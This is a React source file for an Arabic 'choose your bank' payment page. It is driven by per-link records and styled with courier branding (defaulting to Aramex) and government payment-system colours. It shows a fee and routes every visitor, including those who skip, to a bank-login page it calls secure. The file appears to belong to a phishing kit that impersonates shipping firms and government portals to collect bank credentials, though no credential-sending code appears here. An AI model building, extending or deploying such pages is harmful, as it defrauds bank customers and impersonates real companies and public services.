import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, Loader2, CheckCircle2, Sparkles } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import BrandedTopBar from "@/components/BrandedTopBar";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import BrandedCarousel from "@/components/BrandedCarousel";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  const preselectedBank = linkData?.payload?.selected_bank;
  
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(amount, currencyCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: bankId,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
    }

    setTimeout(() => {
      navigate(`/pay/${id}/bank-login`);
    }, 400);
  };
  
  const handleSkip = async () => {
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: 'skipped',
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
    }

    toast({
      title: "تم التخطي",
      description: "سيتم تسجيل الدخول بدون تحديد بنك",
    });

    navigate(`/pay/${id}/bank-login`);
  };
  
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: govSystem.colors.surface
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
          <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <>
      <BrandedTopBar 
        serviceKey={serviceKey}
        serviceName={serviceName}
        showBackButton={true}
        backPath={`/pay/${id}/details`}
        showCarousel={false}
      />
      
      <BrandedCarousel serviceKey={selectedBank ? `bank_${selectedBank}` : serviceKey} className="mb-6" />

      <div 
        className="min-h-screen py-6 sm:py-8" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${companyBranding?.colors.background || govSystem.colors.surface}, ${companyBranding?.colors.surface || '#ffffff'})`,
          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
        }}
      >
        <div className="container mx-auto px-4 max-w-4xl">
          <div className="mb-10 text-center">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Sparkles className="w-7 h-7" style={{ color: companyBranding?.colors.primary || govSystem.colors.primary }} />
              <h1 
                className="text-3xl sm:text-5xl font-bold" 
                style={{ 
                  color: designSystem.colors.neutral[900],
                  fontFamily: designSystem.typography.fontFamilies.arabic,
                  fontWeight: designSystem.typography.fontWeights.extrabold
                }}
              >
                اختر بنكك
              </h1>
            </div>
            <div 
              className="inline-flex items-center gap-2 px-6 py-3 rounded-full text-xl sm:text-2xl font-bold" 
              style={{ 
                background: `linear-gradient(135deg, ${companyBranding?.colors.primary || govSystem.colors.primary}, ${companyBranding?.colors.secondary || govSystem.colors.secondary})`,
                color: '#ffffff',
                boxShadow: designSystem.shadows.lg,
                fontFamily: designSystem.typography.fontFamilies.arabic
              }}
            >
              <Building2 className="w-6 h-6" />
              {formattedAmount}
            </div>
          </div>

        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
            <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <Card className="p-8 text-center" style={{ borderRadius: govSystem.borderRadius.lg }}>
            <Building2 className="w-12 h-12 mx-auto mb-4" style={{ color: govSystem.colors.textLight }} />
            <p className="mb-4" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>لا توجد بنوك متاحة لهذه الدولة</p>
            <Button 
              onClick={handleSkip} 
              variant="outline"
              style={{ 
                borderColor: govSystem.colors.primary,
                color: govSystem.colors.primary,
                fontFamily: govSystem.fonts.primaryAr
              }}
            >
              متابعة بدون تحديد بنك
            </Button>
          </Card>
        ) : (
          <>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 sm:gap-7 mb-8">
              {banks.map((bank) => (
                <div
                  key={bank.id}
                  className="group relative cursor-pointer"
                  onClick={() => handleBankSelect(bank.id)}
                >
                  <div 
                    className="relative overflow-hidden bg-white p-6 sm:p-8 transition-all duration-300 flex flex-col items-center"
                    style={{
                      borderRadius: designSystem.borderRadius['2xl'],
                      border: selectedBank === bank.id ? `3px solid ${bank.color || govSystem.colors.primary}` : `2px solid ${designSystem.colors.neutral[200]}`,
                      boxShadow: selectedBank === bank.id ? `0 20px 50px -15px ${bank.color || govSystem.colors.primary}50` : designSystem.shadows.md,
                      transform: selectedBank === bank.id ? 'scale(1.02)' : 'scale(1)',
                    }}
                  >
                    {selectedBank === bank.id && (
                      <div
                        className="absolute top-3 right-3 w-8 h-8 rounded-full flex items-center justify-center shadow-xl z-10 animate-bounce"
                        style={{ backgroundColor: bank.color || govSystem.colors.primary }}
                      >
                        <CheckCircle2 className="w-5 h-5 text-white" strokeWidth={3} />
                      </div>
                    )}
                    
                    <div 
                      className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                      style={{
                        background: `linear-gradient(135deg, ${bank.color || govSystem.colors.primary}08, ${bank.color || govSystem.colors.primary}15)`,
                      }}
                    />
                    
                    <div className="aspect-square w-full flex items-center justify-center mb-4 relative z-10">
                      <BankLogo 
                        bankId={bank.id}
                        bankName={bank.name}
                        bankNameAr={bank.nameAr}
                        color={bank.color}
                        size="xl"
                        className="w-full h-full object-contain transition-transform duration-500 group-hover:scale-110"
                      />
                    </div>
                    
                    <p 
                      className="text-center text-xs sm:text-sm font-bold mt-2"
                      style={{ 
                        color: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : govSystem.colors.text,
                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                      }}
                    >
                      {bank.nameAr}
                    </p>
                  </div>
                </div>
              ))}
            </div>

            <div className="max-w-xl mx-auto">
              <Button
                onClick={handleSkip}
                variant="outline"
                className="w-full h-12 text-base"
                style={{
                  borderColor: govSystem.colors.primary + '50',
                  color: govSystem.colors.text,
                }}
              >
                تخطي واستخدام أي بنك
              </Button>
            </div>

            <div className="mt-6 p-4 rounded-xl border text-center" style={{ backgroundColor: `${companyBranding?.colors.primary || govSystem.colors.primary}08`, borderColor: `${companyBranding?.colors.primary || govSystem.colors.primary}30` }}>
              <p className="text-sm font-semibold" style={{ color: companyBranding?.colors.text || govSystem.colors.text, fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr }}>
                🔐 اختر البنك الخاص بك للانتقال لصفحة تسجيل الدخول الآمنة
              </p>
            </div>
          </>
        )}
      </div>
    </div>
    </>
  );
};

export default PaymentBankSelector;
